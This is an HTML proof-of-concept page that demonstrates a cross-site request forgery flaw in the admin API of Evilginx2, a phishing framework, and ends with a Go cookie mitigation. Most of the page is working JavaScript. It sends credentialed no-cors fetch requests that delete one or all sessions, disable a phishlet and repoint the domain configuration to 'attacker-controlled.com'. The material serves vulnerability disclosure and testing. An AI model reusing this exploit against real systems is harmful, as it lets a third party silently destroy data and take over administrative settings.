<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSRF Attack Demonstration</title>
    <style>
        body {
            font-family: 'Courier New', monospace;
            background: #1a1a1a;
            color: #00ff00;
            padding: 20px;
            max-width: 800px;
            margin: 0 auto;
        }
        .container {
            background: #2a2a2a;
            border: 2px solid #00ff00;
            padding: 20px;
            border-radius: 5px;
        }
        h1 {
            color: #ff0000;
            text-align: center;
        }
        .warning {
            background: #ff000020;
            border: 1px solid #ff0000;
            padding: 10px;
            margin: 20px 0;
            border-radius: 3px;
        }
        .attack-box {
            background: #000;
            border: 1px solid #555;
            padding: 15px;
            margin: 20px 0;
            border-radius: 3px;
        }
        button {
            background: #ff0000;
            color: #fff;
            border: none;
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
            border-radius: 3px;
            margin: 5px;
        }
        button:hover {
            background: #cc0000;
        }
        .success {
            color: #00ff00;
        }
        .info {
            color: #00aaff;
        }
        pre {
            background: #000;
            padding: 10px;
            overflow-x: auto;
            border: 1px solid #555;
        }
        #log {
            background: #000;
            border: 1px solid #555;
            padding: 10px;
            min-height: 200px;
            margin-top: 20px;
            font-size: 12px;
            overflow-y: auto;
            max-height: 400px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>‚ö†Ô∏è CSRF Vulnerability Demonstration</h1>
        
        <div class="warning">
            <strong>WARNING:</strong> This is a proof-of-concept demonstration for security testing only.
            This page demonstrates a Cross-Site Request Forgery (CSRF) vulnerability in the Evilginx2 Admin API.
        </div>

        <div class="attack-box">
            <h3>üéØ Target Vulnerability</h3>
            <p><strong>Issue:</strong> Admin session cookies lack SameSite attribute</p>
            <p><strong>File:</strong> <code>core/admin_api.go:320-326</code></p>
            <p><strong>Severity:</strong> HIGH</p>
            <p><strong>Impact:</strong> Authenticated requests can be made from malicious sites</p>
        </div>

        <div class="attack-box">
            <h3>üìã Configuration</h3>
            <label>Target URL:</label>
            <input type="text" id="targetUrl" value="http://localhost:5555" style="width: 400px; padding: 5px; margin-left: 10px;">
        </div>

        <div class="attack-box">
            <h3>üî• Attack Scenarios</h3>
            <p>These attacks will succeed if the admin is logged in and visits this page:</p>
            
            <button onclick="attackDeleteSession()">Attack 1: Delete Session</button>
            <button onclick="attackDeleteAllSessions()">Attack 2: Delete ALL Sessions</button>
            <button onclick="attackDisablePhishlet()">Attack 3: Disable Phishlet</button>
            <button onclick="attackChangeConfig()">Attack 4: Change Config</button>
        </div>

        <div class="attack-box">
            <h3>üìä Attack Log</h3>
            <div id="log"></div>
        </div>

        <div class="attack-box">
            <h3>üõ°Ô∏è Mitigation</h3>
            <pre>// Fix in core/admin_api.go
http.SetCookie(w, &http.Cookie{
    Name:     "admin_session",
    Value:    sessionID,
    Path:     "/",
    HttpOnly: true,
    Secure:   true,                    // ‚úÖ Add this
    SameSite: http.SameSiteStrictMode, // ‚úÖ Add this
    MaxAge:   86400,
})</pre>
        </div>

        <div class="attack-box">
            <h3>üìñ How This Works</h3>
            <ol>
                <li>Admin authenticates to Evilginx2 admin panel</li>
                <li>Session cookie is set (without SameSite protection)</li>
                <li>Admin visits attacker's website (this page)</li>
                <li>JavaScript makes requests to admin API</li>
                <li>Browser automatically includes session cookie</li>
                <li>Server accepts requests as authenticated admin</li>
                <li>Attacker can perform any admin action</li>
            </ol>
        </div>
    </div>

    <script>
        function log(message, type = 'info') {
            const logDiv = document.getElementById('log');
            const timestamp = new Date().toLocaleTimeString();
            const colors = {
                'info': '#00aaff',
                'success': '#00ff00',
                'error': '#ff0000',
                'warning': '#ffaa00'
            };
            const color = colors[type] || colors['info'];
            logDiv.innerHTML += `<div style="color: ${color}">[${timestamp}] ${message}</div>`;
            logDiv.scrollTop = logDiv.scrollHeight;
        }

        function getTargetUrl() {
            return document.getElementById('targetUrl').value;
        }

        async function makeRequest(url, method = 'GET', body = null) {
            try {
                log(`Attempting ${method} request to: ${url}`, 'info');
                
                const options = {
                    method: method,
                    credentials: 'include', // This includes cookies!
                    mode: 'no-cors', // Bypass CORS for demo
                };

                if (body) {
                    options.headers = {
                        'Content-Type': 'application/json'
                    };
                    options.body = JSON.stringify(body);
                }

                const response = await fetch(url, options);
                
                // Note: Due to no-cors, we can't read response
                log('Request sent! (Response hidden due to CORS)', 'success');
                log('If admin was logged in, attack succeeded!', 'warning');
                
                return true;
            } catch (error) {
                log(`Error: ${error.message}`, 'error');
                return false;
            }
        }

        function attackDeleteSession() {
            log('=== Attack 1: Delete Session ===', 'warning');
            log('Attempting to delete session ID 1...', 'info');
            const url = `${getTargetUrl()}/api/sessions/1`;
            makeRequest(url, 'DELETE');
        }

        function attackDeleteAllSessions() {
            log('=== Attack 2: Delete ALL Sessions ===', 'warning');
            log('Attempting to delete all phishing sessions...', 'info');
            const url = `${getTargetUrl()}/api/sessions`;
            makeRequest(url, 'DELETE');
        }

        function attackDisablePhishlet() {
            log('=== Attack 3: Disable Phishlet ===', 'warning');
            log('Attempting to disable phishlet "example"...', 'info');
            const url = `${getTargetUrl()}/api/phishlets/example/disable`;
            makeRequest(url, 'POST');
        }

        function attackChangeConfig() {
            log('=== Attack 4: Change Configuration ===', 'warning');
            log('Attempting to change domain configuration...', 'info');
            const url = `${getTargetUrl()}/api/config`;
            makeRequest(url, 'POST', {
                field: 'domain',
                value: 'attacker-controlled.com'
            });
        }

        // Log when page loads
        window.onload = function() {
            log('CSRF PoC loaded and ready', 'info');
            log('If admin visits this page while logged in, attacks will succeed', 'warning');
            log('Ready to demonstrate CSRF vulnerability...', 'info');
        };
    </script>
</body>
</html>

